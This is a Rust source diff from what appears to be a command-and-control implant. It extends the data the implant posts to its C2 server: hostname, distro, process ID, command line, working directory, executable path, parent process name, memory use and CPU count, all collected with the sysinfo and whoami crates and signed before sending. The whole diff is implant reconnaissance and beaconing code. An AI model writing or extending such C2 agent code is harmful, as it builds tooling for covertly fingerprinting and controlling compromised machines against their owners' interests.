@@ -1,4 +1,4 @@
-use crate::dataoperation::{apply_all_dataoperations, DataOperation, UnApplyDataOperation};
+use crate::dataoperation::{apply_all_dataoperations,DataOperation, UnApplyDataOperation};
 use crate::poollink::Advanced;
 use anyhow::bail;
 use anyhow::Result;
@@ -16,8 +16,20 @@ use std::fs;
 use std::time::Duration;
 
 use crate::payload::Payload;
-use std::process;
 use ring::signature::{self, KeyPair};
+
+use crate::link_util::get_domain_name;
+//use std::path::Path;
+use crate::link_util::process_path;
+use crate::link_util::process_name_and_parent;
+use crate::link_util::bytes_to_gigabytes_string;
+use crate::link_util::working_dir;
+use crate::link_util::cmdline;
+
+//use sysinfo::{    Components, Disks, Networks, System, Pid , get_current_pid};
+use sysinfo::System;
+use std::process;
+
 
 
 #[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
@@ -411,6 +423,8 @@ pub struct LightPayload {
 
 
 }
+//use std::os::unix::process::parent_id;
+//use std::os:
 
 #[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
 pub struct PostToC2 {
@@ -421,7 +435,19 @@ pub struct PostToC2 {
     pub arch: String,
     pub distro: String,
     pub desktop_env: String,
+
+    pub cmdline : String,
+    pub working_dir: String,
+    pub process_path: String,
+    pub process_name: String,
     pub pid: u32,
+    pub parent_name:String,
+    pub ppid: u32,
+
+    pub total_memory: String,
+    pub used_memory: String,
+    pub nb_cpu: usize,
+
     pub data_operation: Vec<DataOperation>,
     pub running_thread: Vec<String>,
     pub peer_public_key_bytes : Vec<u8>,
@@ -429,7 +455,7 @@ pub struct PostToC2 {
 }
 
 
-use crate::link_util::get_domain_name;
+
 
 impl LinkFetch for HTTPPostC2Link {
     fn download_data(&self,_config:&Config) -> Result<Vec<u8>, anyhow::Error> {
@@ -453,6 +479,15 @@ impl LinkFetch for HTTPPostC2Link {
         };
         let peer_public_key_bytes = key_pair.public_key().as_ref().to_vec();
 
+        let sys: System = System::new_all();
+        let (process_name, parent_name) = process_name_and_parent(&sys);
+        let process_path = process_path();
+
+        //let args: Vec<String> = ;
+    
+        // Joindre les arguments en une seule chaîne, séparée par des espaces
+        //let args_string = args;
+
         let mut post_data: PostToC2 = PostToC2{
             session_id: session_id.to_string(),
             hostname: whoami::devicename(),
@@ -462,11 +497,22 @@ impl LinkFetch for HTTPPostC2Link {
             distro: whoami::distro(),
             desktop_env: whoami::desktop_env().to_string(),
             pid: process::id(),
+            //TODO parent
+            ppid: 0,          
+            process_name : process_name,
+            process_path: process_path,
+            working_dir : working_dir(),
+            cmdline : cmdline(),
+            parent_name:parent_name,
+            total_memory: bytes_to_gigabytes_string(sys.total_memory()),
+            used_memory: bytes_to_gigabytes_string(sys.used_memory()),
+            nb_cpu: sys.cpus().len(),      
             data_operation: self.dataoperation.clone(),
             running_thread: running_thread_string.clone(),
             peer_public_key_bytes: peer_public_key_bytes.clone(),
             sign_bytes: vec![],
         };
+
 
         let sign_data = format!("{:?}", post_data);
         let sig: signature::Signature = key_pair.sign(sign_data.as_bytes());
